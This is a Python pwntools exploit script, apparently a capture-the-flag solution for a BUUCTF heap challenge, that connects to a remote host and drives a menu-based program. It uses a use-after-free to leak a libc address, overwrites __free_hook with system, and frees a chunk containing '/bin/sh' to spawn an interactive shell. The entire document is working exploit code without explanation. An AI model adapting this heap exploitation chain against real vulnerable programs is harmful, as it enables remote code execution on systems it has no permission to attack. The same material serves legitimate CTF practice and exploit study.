from pwn import *

io=remote('node3.buuoj.cn',28791)
libc=ELF('./libc-2.23.so')

def add(name,sex,data):
    io.recvuntil('choice :')
    io.sendline('1')
    io.recvuntil("name")
    io.send(name)
    io.recvuntil('sex')
    io.send(sex)
    io.recvuntil('information')
    io.send(data)

def show(idx):
    io.recvuntil('choice :')
    io.sendline('2')
    io.recvuntil('index :')
    io.sendline(str(idx))

def edit(idx,data):
    io.recvuntil('choice :')
    io.sendline('3')
    io.recvuntil('index :')
    io.sendline(str(idx))
    io.recvuntil('sex?')
    io.sendline(str('Y'))
    io.recvuntil('information')
    io.send(data)

def free(idx):
    io.recvuntil('choice :')
    io.sendline('4')
    io.recvuntil('index :')
    io.sendline(str(idx))

add('a'*8,'1','a'*0x70)#0
add('/bin/sh\x00','1','a'*0x70)#1
free(0)
show(0)
libc_base=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c4b78
free_hook=libc_base+libc.sym['__free_hook']
sys=libc_base+libc.sym['system']
print(hex(libc_base))
add('c'*8,'1','a'*0x70)#2
add('d'*8,'1','a'*0x70)#3
edit(0,p64(0)+p64(0x21)+p64(free_hook-0x10)+'a'*0x58)
edit(3,p64(sys)+'a'*0x68)
free(1)

io.interactive()
